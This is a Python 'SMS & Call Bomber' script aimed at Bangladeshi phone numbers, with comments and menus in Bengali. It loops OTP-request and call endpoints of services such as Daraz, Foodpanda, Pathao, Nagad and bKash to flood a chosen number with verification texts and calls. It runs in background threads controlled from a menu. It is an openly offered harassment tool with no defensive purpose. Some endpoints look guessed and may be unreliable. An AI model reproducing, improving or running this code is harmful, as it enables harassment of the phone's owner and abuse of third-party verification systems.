import requests
import time
import threading
import os

# ✅ বাংলাদেশি SMS ও Call API তালিকা
sms_api_list = {
    "Bikroy": "https://bikroy.com/data/phone_number_login/verifications?phone=+880",
    "Rokomari": "https://www.rokomari.com/resend-verification-code?email_phone=+880",
    "Daraz": "https://member.daraz.com.bd/api/v1/user/login/otp?phone=+880",
    "Pickaboo": "https://api.pickaboo.com/api/v1/customer/login/request-otp/?msisdn=+880",
    "Foodpanda": "https://identity.foodpanda.com.bd/v1/authentication/request-otp?phoneNumber=+880",
    "Evaly": "https://api.evaly.com.bd/auth/api/login/send-otp?phone=880"
}

call_api_list = {
    "Nagad": "https://api.nagad.com/api/send-call?phone=+880",
    "bKash": "https://api.bikash.com/api/send-call?phone=+880",
    "Uber": "https://auth.uber.com/api/send-call?phone=+880",
    "Pathao": "https://api.pathao.com/api/auth/call/send?phone=+880",
    "Shohoz": "https://www.shohoz.com/api/send-call?phone=+880"
}

running_sms = False
running_call = False

# ✅ পরিষ্কার স্ক্রিন ফাংশন
def clear_screen():
    os.system("clear")

# ✅ SMS বোম্বিং ফাংশন
def start_sms_bombing(number, limit):
    global running_sms
    running_sms = True
    request_count = {api: 0 for api in sms_api_list.keys()}
    
    for i in range(limit):
        if not running_sms:
            break  
        
        for api_name, api_url in sms_api_list.items():
            if request_count[api_name] < 10:
                url = f"{api_url}{number}"
                response = requests.get(url)

                if response.status_code == 200:
                    print(f"[✅] SMS Sent via {api_name}")
                    request_count[api_name] += 1
                else:
                    print(f"[❌] SMS Failed via {api_name}")

                time.sleep(2)

            else:
                print(f"[⚠️] {api_name} Limit Reached! Skipping...")

    print("✅ SMS Bombing Completed!")

# ✅ Call বোম্বিং ফাংশন
def start_call_bombing(number, limit):
    global running_call
    running_call = True
    request_count = {api: 0 for api in call_api_list.keys()}
    
    for i in range(limit):
        if not running_call:
            break  
        
        for api_name, api_url in call_api_list.items():
            if request_count[api_name] < 10:
                url = f"{api_url}{number}"
                response = requests.get(url)

                if response.status_code == 200:
                    print(f"[✅] Call Sent via {api_name}")
                    request_count[api_name] += 1
                else:
                    print(f"[❌] Call Failed via {api_name}")

                time.sleep(2)

            else:
                print(f"[⚠️] {api_name} Limit Reached! Skipping...")

    print("✅ Call Bombing Completed!")

# ✅ মেইন মেনু ফাংশন
def main():
    while True:
        clear_screen()
        print("╔══════════════════════════╗")
        print("║  CALL & SMS BOMBER (BD)  ║")
        print("╚══════════════════════════╝")
        print("\n1️⃣ Start SMS Bomber")
        print("2️⃣ Start Call Bomber")
        print("3️⃣ Stop SMS Bomber")
        print("4️⃣ Stop Call Bomber")
        print("5️⃣ Exit")
        
        choice = input("\n👉 Enter your choice: ")

        if choice == "1":
            number = input("📞 Enter Phone Number (without +880): ")
            limit = int(input("🔢 Enter Number of Requests: "))
            if not number.isdigit() or len(number) != 10:
                print("❌ Invalid Phone Number!")
                time.sleep(2)
            else:
                threading.Thread(target=start_sms_bombing, args=(number, limit)).start()
                input("🚀 Press Enter to Continue...")

        elif choice == "2":
            number = input("📞 Enter Phone Number (without +880): ")
            limit = int(input("🔢 Enter Number of Requests: "))
            if not number.isdigit() or len(number) != 10:
                print("❌ Invalid Phone Number!")
                time.sleep(2)
            else:
                threading.Thread(target=start_call_bombing, args=(number, limit)).start()
                input("🚀 Press Enter to Continue...")

        elif choice == "3":
            global running_sms
            running_sms = False
            print("❌ SMS Bombing Stopped!")
            time.sleep(2)

        elif choice == "4":
            global running_call
            running_call = False
            print("❌ Call Bombing Stopped!")
            time.sleep(2)

        elif choice == "5":
            print("👋 Exiting... Bye!")
            time.sleep(2)
            break

        else:
            print("❌ Invalid Choice! Try Again.")
            time.sleep(2)

# ✅ স্ক্রিপ্ট রান করা
if __name__ == "__main__":
    main()
    